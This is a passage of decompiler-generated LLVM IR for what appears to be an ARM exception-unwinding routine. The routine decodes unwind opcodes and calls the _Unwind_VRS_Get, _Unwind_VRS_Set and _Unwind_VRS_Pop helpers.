  %v1_18be0 = add i32 %v0_18be0, 8
  %v2_18be0 = inttoptr i32 %v1_18be0 to i8*
  %v3_18be0 = load i8, i8* %v2_18be0, align 1
  %v4_18be0 = zext i8 %v3_18be0 to i32
  store i32 %v4_18be0, i32* %r3.global-to-local, align 4
  %v0_18be4 = load i32, i32* @r4, align 4
  %v1_18be4 = and i32 %v0_18be4, 32768
  %v2_18be4 = icmp eq i32 %v1_18be4, 0
  store i1 %v2_18be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18be4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_18be0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18be0, %bb147
  %v2_18bec = icmp eq i8 %v3_18be0, 0
  store i1 %v2_18bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bec, label %dec_label_pc_18bfc, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_18bf0 = add nsw i32 %v4_18be0, -1
  store i32 %v2_18bf0, i32* %r3.global-to-local, align 4
  %v2_18bf4 = trunc i32 %v2_18bf0 to i8
  store i8 %v2_18bf4, i8* %v2_18be0, align 1
  %v0_18bf8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18bf8.pr.pr, label %.thread6.dec_label_pc_18bfc_crit_edge, label %dec_label_pc_18b28

.thread6.dec_label_pc_18bfc_crit_edge:            ; preds = %.thread6
  %v0_18bfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18bfc

dec_label_pc_18bfc:                               ; preds = %bb148, %.thread6.dec_label_pc_18bfc_crit_edge
  %v0_18bfc = phi i32 [ %v0_18bfc.pre, %.thread6.dec_label_pc_18bfc_crit_edge ], [ %v0_18be0, %bb148 ]
  %v1_18bfc = add i32 %v0_18bfc, 9
  %v2_18bfc = inttoptr i32 %v1_18bfc to i8*
  %v3_18bfc = load i8, i8* %v2_18bfc, align 1
  %v4_18bfc = zext i8 %v3_18bfc to i32
  store i32 %v4_18bfc, i32* %r3.global-to-local, align 4
  %v2_18c00 = icmp eq i8 %v3_18bfc, 0
  store i1 %v2_18c00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c00, label %dec_label_pc_18c08, label %dec_label_pc_18b0c

dec_label_pc_18c08:                               ; preds = %dec_label_pc_18bfc, %dec_label_pc_18b00, %dec_label_pc_18b28
  %v0_18c08 = load i32, i32* @sl, align 4
  %v2_18c08 = icmp eq i32 %v0_18c08, 0
  store i1 %v2_18c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c08, label %dec_label_pc_18cd0, label %bb149

bb149:                                            ; preds = %dec_label_pc_18c08
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c14

dec_label_pc_18c14:                               ; preds = %bb149, %dec_label_pc_19184, %dec_label_pc_19024, %dec_label_pc_18e48, %dec_label_pc_18e00, %dec_label_pc_18dbc, %dec_label_pc_18cd0
  %v1_18c1c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_19184 ], [ 9, %dec_label_pc_19024 ], [ 9, %dec_label_pc_18e48 ], [ 9, %dec_label_pc_18e00 ], [ 9, %dec_label_pc_18dbc ], [ %v0_18d04, %dec_label_pc_18cd0 ]
  store i32 %v9_18ad8, i32* %r6.global-to-local, align 4
  store i32 %v21_18ad8, i32* @lr, align 4
  ret i32 %v1_18c1c

dec_label_pc_18c20:                               ; preds = %dec_label_pc_18b44
  %v1_18c20 = mul i32 %v0_18b44, 4
  %v3_18c24 = and i32 %v1_18c20, 252
  store i32 %v3_18c24, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18c30 = load i32, i32* @r7, align 4
  store i32 %v0_18c30, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_18c38 = add nuw nsw i32 %v3_18c24, 4
  store i32 %v1_18c38, i32* %r6.global-to-local, align 4
  %v5_18c40 = call i32 @_Unwind_VRS_Get(i32 %v0_18c30, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_18c44 = load i32, i32* @r4, align 4
  %v1_18c44 = and i32 %v0_18c44, 64
  %v2_18c44 = icmp eq i32 %v1_18c44, 0
  store i1 %v2_18c44, i1* %cpsr_z.global-to-local, align 1
  %v4_18c4c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18c58 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_18c58
  %storemerge160.p = select i1 %v2_18c44, i32 %v2_18c58, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_18c4c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_18c74 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18c74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18aec.backedge

dec_label_pc_18aec.backedge:                      ; preds = %dec_label_pc_18c20, %dec_label_pc_18c9c, %dec_label_pc_19120, %dec_label_pc_18dec, %dec_label_pc_18e24, %dec_label_pc_18da4, %dec_label_pc_19010
  %v0_18aec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18aec

dec_label_pc_18c7c:                               ; preds = %dec_label_pc_18b4c
  %v7_18c7c = icmp eq i32 %v1_18b4c, 144
  store i1 %v7_18c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18c7c, label %dec_label_pc_18c84, label %dec_label_pc_18dc4

dec_label_pc_18c84:                               ; preds = %dec_label_pc_18c7c
  %v1_18c84 = urem i32 %v0_18b44, 16
  store i32 %v1_18c84, i32* %r2.global-to-local, align 4
  %v2_18c88 = icmp eq i32 %v1_18c84, 15
  store i1 %v2_18c88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c88, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_18c84
  %v8_18c8c = icmp eq i32 %v1_18c84, 13
  store i1 %v8_18c8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18c8c, label %bb154, label %dec_label_pc_18c9c

.thread21:                                        ; preds = %dec_label_pc_18c84
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18dbc

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18dbc

dec_label_pc_18c9c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18ca8 = load i32, i32* @r7, align 4
  store i32 %v0_18ca8, i32* %r0.global-to-local, align 4
  %v5_18cb0 = call i32 @_Unwind_VRS_Get(i32 %v0_18ca8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_18cb8 = load i32, i32* @r7, align 4
  store i32 %v0_18cb8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_18cc8 = call i32 @_Unwind_VRS_Set(i32 %v0_18cb8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18cc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18aec.backedge

dec_label_pc_18cd0:                               ; preds = %dec_label_pc_18c08
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_18ce0 = load i32, i32* @r7, align 4
  store i32 %v0_18ce0, i32* %r0.global-to-local, align 4
  %v7_18ce8 = call i32 @_Unwind_VRS_Get(i32 %v0_18ce0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_18cec = load i32, i32* @r7, align 4
  store i32 %v0_18cec, i32* %r0.global-to-local, align 4
  %v0_18cf0 = load i32, i32* @sl, align 4
  store i32 %v0_18cf0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_18cf0, i32* %r3.global-to-local, align 4
  %v5_18d00 = call i32 @_Unwind_VRS_Set(i32 %v0_18cec, i32 %v0_18cf0, i32 15, i32 %v0_18cf0, i8* bitcast (i32* @0 to i8*))
  %v0_18d04 = load i32, i32* @sl, align 4
  store i32 %v0_18d04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c14

dec_label_pc_18d0c:                               ; preds = %dec_label_pc_18f00
  %v7_18d0c = icmp eq i32 %v0_18f00, 199
  store i1 %v7_18d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d0c, label %dec_label_pc_18fe0, label %dec_label_pc_18d14

dec_label_pc_18d14:                               ; preds = %dec_label_pc_18d0c
  %v1_18d14 = and i32 %v0_18b44, 248
  store i32 %v1_18d14, i32* %r3.global-to-local, align 4
  %v7_18d18 = icmp eq i32 %v1_18d14, 192
  store i1 %v7_18d18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d18, label %.thread24, label %dec_label_pc_18d30

.thread24:                                        ; preds = %dec_label_pc_18d14
  %v2_18d1c = urem i32 %v0_18b44, 16
  %v2_18d20 = add nuw nsw i32 %v2_18d1c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_18d28 = or i32 %v2_18d20, 655360
  store i32 %v2_18d28, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18dec

dec_label_pc_18d30:                               ; preds = %dec_label_pc_18d14
  %v7_18d30 = icmp eq i32 %v0_18f00, 200
  store i1 %v7_18d30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d30, label %dec_label_pc_18f74, label %dec_label_pc_18d38

dec_label_pc_18d38:                               ; preds = %dec_label_pc_18d30
  %v7_18d38 = icmp eq i32 %v0_18f00, 201
  store i1 %v7_18d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d38, label %dec_label_pc_18d40, label %dec_label_pc_18dbc

dec_label_pc_18d40:                               ; preds = %dec_label_pc_18d38
  %v0_18d40 = load i32, i32* @r5, align 4
  %v1_18d40 = add i32 %v0_18d40, 8
  %v2_18d40 = inttoptr i32 %v1_18d40 to i8*
  %v3_18d40 = load i8, i8* %v2_18d40, align 1
  %v4_18d40 = zext i8 %v3_18d40 to i32
  store i32 %v4_18d40, i32* %r3.global-to-local, align 4
  %v2_18d44 = icmp eq i8 %v3_18d40, 0
  store i1 %v2_18d44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d44, label %dec_label_pc_18d54, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_18d40
  %v2_18d48 = add nsw i32 %v4_18d40, -1
  store i32 %v2_18d48, i32* %r3.global-to-local, align 4
  %v2_18d4c = trunc i32 %v2_18d48 to i8
  store i8 %v2_18d4c, i8* %v2_18d40, align 1
  %v0_18d50.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d50.pr.pr, label %.thread26.dec_label_pc_18d54_crit_edge, label %dec_label_pc_18d88

.thread26.dec_label_pc_18d54_crit_edge:           ; preds = %.thread26
  %v0_18d54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18d54

dec_label_pc_18d54:                               ; preds = %.thread26.dec_label_pc_18d54_crit_edge, %dec_label_pc_18d40
  %v2_18d6c = phi i32 [ %v0_18d54.pre, %.thread26.dec_label_pc_18d54_crit_edge ], [ %v0_18d40, %dec_label_pc_18d40 ]
  %v1_18d54 = add i32 %v2_18d6c, 9
  %v2_18d54 = inttoptr i32 %v1_18d54 to i8*
  %v3_18d54 = load i8, i8* %v2_18d54, align 1
  %v4_18d54 = zext i8 %v3_18d54 to i32
  store i32 %v4_18d54, i32* %r3.global-to-local, align 4
  %v2_18d58 = icmp eq i8 %v3_18d54, 0
  store i1 %v2_18d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d58, label %dec_label_pc_18da4, label %dec_label_pc_18d68

dec_label_pc_18d68:                               ; preds = %dec_label_pc_18d54
  %v1_18d68 = add nsw i32 %v4_18d54, -1
  store i32 %v1_18d68, i32* %r3.global-to-local, align 4
  %v1_18d6c = trunc i32 %v1_18d68 to i8
  store i8 %v1_18d6c, i8* %v2_18d54, align 1
  %v0_18d70 = load i32, i32* @r5, align 4
  %v1_18d70 = add i32 %v0_18d70, 4
  %v2_18d70 = inttoptr i32 %v1_18d70 to i32*
  %v3_18d70 = load i32, i32* %v2_18d70, align 4
  store i32 %v3_18d70, i32* %r2.global-to-local, align 4
  %v1_18d74 = inttoptr i32 %v3_18d70 to i32*
  %v2_18d74 = load i32, i32* %v1_18d74, align 4
  store i32 %v2_18d74, i32* %r0.global-to-local, align 4
  %v4_18d74 = add i32 %v3_18d70, 4
  store i32 %v4_18d74, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18d74, i32* %v2_18d70, align 4
  %v0_18d80 = load i32, i32* %r3.global-to-local, align 4
  %v1_18d80 = trunc i32 %v0_18d80 to i8
  %v2_18d80 = load i32, i32* @r5, align 4
  %v3_18d80 = add i32 %v2_18d80, 8
  %v4_18d80 = inttoptr i32 %v3_18d80 to i8*
  store i8 %v1_18d80, i8* %v4_18d80, align 1
  %v0_18d84 = load i32, i32* %r0.global-to-local, align 4
  %v1_18d84 = load i32, i32* @r5, align 4
  %v2_18d84 = inttoptr i32 %v1_18d84 to i32*
  store i32 %v0_18d84, i32* %v2_18d84, align 4
  br label %dec_label_pc_18d88

dec_label_pc_18d88:                               ; preds = %.thread26, %dec_label_pc_18d68
  %v0_18d88 = load i32, i32* %r0.global-to-local, align 4
  %v3_18d88 = udiv i32 %v0_18d88, 16777216
  %v1_18d8c = urem i32 %v3_18d88, 16
  %v3_18d90 = mul i32 %v0_18d88, 256
  %v1_18d94 = add nuw nsw i32 %v1_18d8c, 1
  store i32 %v1_18d94, i32* %r1.global-to-local, align 4
  %v1_18d98 = and i32 %v3_18d88, 240
  store i32 %v1_18d98, i32* %r3.global-to-local, align 4
  %v1_18d9c = load i32, i32* @r5, align 4
  %v2_18d9c = inttoptr i32 %v1_18d9c to i32*
  store i32 %v3_18d90, i32* %v2_18d9c, align 4
  %v0_18da0 = load i32, i32* %r1.global-to-local, align 4
  %v1_18da0 = load i32, i32* %r3.global-to-local, align 4
  %v4_18da0 = mul i32 %v1_18da0, 4096
  %v5_18da0 = or i32 %v4_18da0, %v0_18da0
  br label %dec_label_pc_18da4

dec_label_pc_18da4:                               ; preds = %dec_label_pc_18d54, %dec_label_pc_18d88
  %storemerge = phi i32 [ %v5_18da0, %dec_label_pc_18d88 ], [ 720897, %dec_label_pc_18d54 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_18da4 = load i32, i32* @r7, align 4
  store i32 %v0_18da4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18db0 = call i32 @_Unwind_VRS_Pop(i32 %v0_18da4, i32 1, i32 5, i32 5)
  store i32 %v4_18db0, i32* %r0.global-to-local, align 4
  %v2_18db4 = icmp eq i32 %v4_18db0, 0
  store i1 %v2_18db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18db4, label %dec_label_pc_18aec.backedge, label %dec_label_pc_18dbc

dec_label_pc_18dbc:                               ; preds = %dec_label_pc_19008, %dec_label_pc_18d38, %dec_label_pc_18e18, %dec_label_pc_191bc, %dec_label_pc_1918c, %dec_label_pc_19168, %dec_label_pc_18ff4, %dec_label_pc_18da4, %dec_label_pc_18bb8, %dec_label_pc_18bac, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c14

dec_label_pc_18dc4:                               ; preds = %dec_label_pc_18c7c
  %v7_18dc4 = icmp eq i32 %v1_18b4c, 160
  store i1 %v7_18dc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18dc4, label %dec_label_pc_18dcc, label %dec_label_pc_18e08

dec_label_pc_18dcc:                               ; preds = %dec_label_pc_18dc4
  %v0_18dcc = load i32, i32* %ip.global-to-local, align 4
  %v1_18dcc = urem i32 %v0_18dcc, 8
  %v1_18dd0 = xor i32 %v1_18dcc, 7
  store i32 %v1_18dd0, i32* %r3.global-to-local, align 4
  %v6_18dd8 = lshr i32 4080, %v1_18dd0
  %v1_18ddc = and i32 %v0_18b44, 8
  %v2_18ddc = icmp eq i32 %v1_18ddc, 0
  store i1 %v2_18ddc, i1* %cpsr_z.global-to-local, align 1
  %v1_18de0 = and i32 %v6_18dd8, 4080
  %tmp155 = mul nuw nsw i32 %v1_18ddc, 2048
  %tmp156 = or i32 %v1_18de0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18dec

dec_label_pc_18dec:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1917c.dec_label_pc_18dec_crit_edge, %bb157, %dec_label_pc_18fd8, %dec_label_pc_18f6c, %dec_label_pc_18ecc, %dec_label_pc_18dcc
  %v2_18df4 = phi i32 [ %v2_18ef0, %.thread44 ], [ %v2_18ef8, %bb157 ], [ %v2_18df4.pre, %dec_label_pc_1917c.dec_label_pc_18dec_crit_edge ], [ %v2_18d28, %.thread24 ], [ %storemerge130, %dec_label_pc_18fd8 ], [ %storemerge131, %dec_label_pc_18f6c ], [ %storemerge132, %dec_label_pc_18ecc ], [ %tmp156, %dec_label_pc_18dcc ]
  %v0_18df0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1917c.dec_label_pc_18dec_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_18fd8 ], [ 3, %dec_label_pc_18f6c ], [ 1, %dec_label_pc_18ecc ], [ 0, %dec_label_pc_18dcc ]
  %v0_18dec = load i32, i32* @r7, align 4
  store i32 %v0_18dec, i32* %r0.global-to-local, align 4
  store i32 %v0_18df0, i32* %r3.global-to-local, align 4
  %v4_18df4 = call i32 @_Unwind_VRS_Pop(i32 %v0_18dec, i32 %v0_18df0, i32 %v2_18df4, i32 %v0_18df0)
  store i32 %v4_18df4, i32* %r0.global-to-local, align 4
  %v2_18df8 = icmp eq i32 %v4_18df4, 0
  store i1 %v2_18df8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18df8, label %dec_label_pc_18aec.backedge, label %dec_label_pc_18e00

dec_label_pc_18e00:                               ; preds = %dec_label_pc_18dec
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c14

dec_label_pc_18e08:                               ; preds = %dec_label_pc_18dc4
  %v7_18e08 = icmp eq i32 %v1_18b4c, 176
  store i1 %v7_18e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e08, label %dec_label_pc_18e50, label %dec_label_pc_18e10

dec_label_pc_18e10:                               ; preds = %dec_label_pc_18e08
  %v7_18e10 = icmp eq i32 %v1_18b4c, 192
  store i1 %v7_18e10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e10, label %dec_label_pc_18f00, label %dec_label_pc_18e18

dec_label_pc_18e18:                               ; preds = %dec_label_pc_18e10
  %v1_18e18 = and i32 %v0_18b44, 248
  store i32 %v1_18e18, i32* %r3.global-to-local, align 4
  %v7_18e1c = icmp eq i32 %v1_18e18, 208
  store i1 %v7_18e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e1c, label %dec_label_pc_18e24, label %dec_label_pc_18dbc

dec_label_pc_18e24:                               ; preds = %dec_label_pc_18e18
  %v1_18e24 = urem i32 %v0_18b44, 8
  %v1_18e28 = add nuw nsw i32 %v1_18e24, 1
  %v1_18e2c = or i32 %v1_18e28, 524288
  store i32 %v1_18e2c, i32* %r2.global-to-local, align 4
  %v0_18e30 = load i32, i32* @r7, align 4
  store i32 %v0_18e30, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_18e3c = call i32 @_Unwind_VRS_Pop(i32 %v0_18e30, i32 1, i32 %v1_18e2c, i32 5)
  store i32 %v4_18e3c, i32* %r0.global-to-local, align 4
  %v2_18e40 = icmp eq i32 %v4_18e3c, 0
  store i1 %v2_18e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e40, label %dec_label_pc_18aec.backedge, label %dec_label_pc_18e48

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18e24
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c14

dec_label_pc_18e50:                               ; preds = %dec_label_pc_18e08
  %v0_18e50 = load i32, i32* %ip.global-to-local, align 4
  %v7_18e50 = icmp eq i32 %v0_18e50, 177
  store i1 %v7_18e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e50, label %dec_label_pc_19154, label %dec_label_pc_18e58

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e50
  %v7_18e58 = icmp eq i32 %v0_18e50, 178
  store i1 %v7_18e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e58, label %dec_label_pc_1902c, label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e58
  %v7_18e60 = icmp eq i32 %v0_18e50, 179
  store i1 %v7_18e60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18e60, label %dec_label_pc_18e68, label %dec_label_pc_18ed4

dec_label_pc_18e68:                               ; preds = %dec_label_pc_18e60
  %v0_18e68 = load i32, i32* @r5, align 4
  %v1_18e68 = add i32 %v0_18e68, 8
  %v2_18e68 = inttoptr i32 %v1_18e68 to i8*
  %v3_18e68 = load i8, i8* %v2_18e68, align 1
  %v4_18e68 = zext i8 %v3_18e68 to i32
  store i32 %v4_18e68, i32* %r3.global-to-local, align 4
  %v2_18e6c = icmp eq i8 %v3_18e68, 0
  store i1 %v2_18e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e6c, label %dec_label_pc_18e7c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_18e68
  %v2_18e70 = add nsw i32 %v4_18e68, -1
  store i32 %v2_18e70, i32* %r3.global-to-local, align 4
  %v2_18e74 = trunc i32 %v2_18e70 to i8
  store i8 %v2_18e74, i8* %v2_18e68, align 1
  %v0_18e78.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e78.pr.pr, label %.thread30.dec_label_pc_18e7c_crit_edge, label %dec_label_pc_18eb0

.thread30.dec_label_pc_18e7c_crit_edge:           ; preds = %.thread30
  %v0_18e7c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e7c

dec_label_pc_18e7c:                               ; preds = %.thread30.dec_label_pc_18e7c_crit_edge, %dec_label_pc_18e68
  %v2_18e94 = phi i32 [ %v0_18e7c.pre, %.thread30.dec_label_pc_18e7c_crit_edge ], [ %v0_18e68, %dec_label_pc_18e68 ]
  %v1_18e7c = add i32 %v2_18e94, 9
  %v2_18e7c = inttoptr i32 %v1_18e7c to i8*
  %v3_18e7c = load i8, i8* %v2_18e7c, align 1
  %v4_18e7c = zext i8 %v3_18e7c to i32
  store i32 %v4_18e7c, i32* %r3.global-to-local, align 4
  %v2_18e80 = icmp eq i8 %v3_18e7c, 0
  store i1 %v2_18e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e80, label %dec_label_pc_18ecc, label %dec_label_pc_18e90

dec_label_pc_18e90:                               ; preds = %dec_label_pc_18e7c
  %v1_18e90 = add nsw i32 %v4_18e7c, -1
  store i32 %v1_18e90, i32* %r3.global-to-local, align 4
  %v1_18e94 = trunc i32 %v1_18e90 to i8
  store i8 %v1_18e94, i8* %v2_18e7c, align 1
  %v0_18e98 = load i32, i32* @r5, align 4
  %v1_18e98 = add i32 %v0_18e98, 4
  %v2_18e98 = inttoptr i32 %v1_18e98 to i32*
  %v3_18e98 = load i32, i32* %v2_18e98, align 4
  store i32 %v3_18e98, i32* %r2.global-to-local, align 4
  %v1_18e9c = inttoptr i32 %v3_18e98 to i32*
  %v2_18e9c = load i32, i32* %v1_18e9c, align 4
  store i32 %v2_18e9c, i32* %r0.global-to-local, align 4
  %v4_18e9c = add i32 %v3_18e98, 4
  store i32 %v4_18e9c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18e9c, i32* %v2_18e98, align 4
  %v0_18ea8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18ea8 = trunc i32 %v0_18ea8 to i8
  %v2_18ea8 = load i32, i32* @r5, align 4
  %v3_18ea8 = add i32 %v2_18ea8, 8
  %v4_18ea8 = inttoptr i32 %v3_18ea8 to i8*
  store i8 %v1_18ea8, i8* %v4_18ea8, align 1
  %v0_18eac = load i32, i32* %r0.global-to-local, align 4
  %v1_18eac = load i32, i32* @r5, align 4
  %v2_18eac = inttoptr i32 %v1_18eac to i32*
  store i32 %v0_18eac, i32* %v2_18eac, align 4
  br label %dec_label_pc_18eb0

dec_label_pc_18eb0:                               ; preds = %.thread30, %dec_label_pc_18e90
  %v0_18eb0 = load i32, i32* %r0.global-to-local, align 4
  %v3_18eb0 = udiv i32 %v0_18eb0, 16777216
  %v1_18eb4 = urem i32 %v3_18eb0, 16
  %v3_18eb8 = mul i32 %v0_18eb0, 256
  store i32 %v3_18eb8, i32* %r0.global-to-local, align 4
  %v1_18ebc = add nuw nsw i32 %v1_18eb4, 1
  store i32 %v1_18ebc, i32* %r2.global-to-local, align 4
  %v1_18ec0 = and i32 %v3_18eb0, 240
  store i32 %v1_18ec0, i32* %r3.global-to-local, align 4
  %v1_18ec4 = load i32, i32* @r5, align 4
  %v2_18ec4 = inttoptr i32 %v1_18ec4 to i32*
  store i32 %v3_18eb8, i32* %v2_18ec4, align 4
  %v0_18ec8 = load i32, i32* %r2.global-to-local, align 4
  %v1_18ec8 = load i32, i32* %r3.global-to-local, align 4
  %v4_18ec8 = mul i32 %v1_18ec8, 4096
  %v5_18ec8 = or i32 %v4_18ec8, %v0_18ec8
  br label %dec_label_pc_18ecc

dec_label_pc_18ecc:                               ; preds = %dec_label_pc_18e7c, %dec_label_pc_18eb0
  %storemerge132 = phi i32 [ %v5_18ec8, %dec_label_pc_18eb0 ], [ 720897, %dec_label_pc_18e7c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18dec

dec_label_pc_18ed4:                               ; preds = %dec_label_pc_18e60
  %v1_18ed4 = and i32 %v0_18b44, 252
  store i32 %v1_18ed4, i32* %r3.global-to-local, align 4
  %v7_18ed8 = icmp eq i32 %v1_18ed4, 180
  store i1 %v7_18ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ed8, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_18ed4
  %v2_18edc = urem i32 %v0_18b44, 4
  %v2_18ee4 = add nuw nsw i32 %v2_18edc, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_18ef0 = or i32 %v2_18ee4, 262144
  store i32 %v2_18ef0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18dec

bb157:                                            ; preds = %dec_label_pc_18ed4
  %v2_18ee0 = urem i32 %v0_18e50, 8
  %v2_18ee8 = add nuw nsw i32 %v2_18ee0, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_18ef8 = or i32 %v2_18ee8, 524288
  store i32 %v2_18ef8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18dec

dec_label_pc_18f00:                               ; preds = %dec_label_pc_18e10
  %v0_18f00 = load i32, i32* %ip.global-to-local, align 4
  %v7_18f00 = icmp eq i32 %v0_18f00, 198
  store i1 %v7_18f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18f00, label %dec_label_pc_18f08, label %dec_label_pc_18d0c

dec_label_pc_18f08:                               ; preds = %dec_label_pc_18f00
  %v0_18f08 = load i32, i32* @r5, align 4
  %v1_18f08 = add i32 %v0_18f08, 8
  %v2_18f08 = inttoptr i32 %v1_18f08 to i8*
  %v3_18f08 = load i8, i8* %v2_18f08, align 1
  %v4_18f08 = zext i8 %v3_18f08 to i32
  store i32 %v4_18f08, i32* %r3.global-to-local, align 4
  %v2_18f0c = icmp eq i8 %v3_18f08, 0
  store i1 %v2_18f0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f0c, label %dec_label_pc_18f1c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_18f08
  %v2_18f10 = add nsw i32 %v4_18f08, -1
  store i32 %v2_18f10, i32* %r3.global-to-local, align 4
  %v2_18f14 = trunc i32 %v2_18f10 to i8
  store i8 %v2_18f14, i8* %v2_18f08, align 1
  %v0_18f18.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f18.pr.pr, label %.thread48.dec_label_pc_18f1c_crit_edge, label %dec_label_pc_18f50

.thread48.dec_label_pc_18f1c_crit_edge:           ; preds = %.thread48
  %v0_18f1c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f1c

dec_label_pc_18f1c:                               ; preds = %.thread48.dec_label_pc_18f1c_crit_edge, %dec_label_pc_18f08
  %v2_18f34 = phi i32 [ %v0_18f1c.pre, %.thread48.dec_label_pc_18f1c_crit_edge ], [ %v0_18f08, %dec_label_pc_18f08 ]
  %v1_18f1c = add i32 %v2_18f34, 9
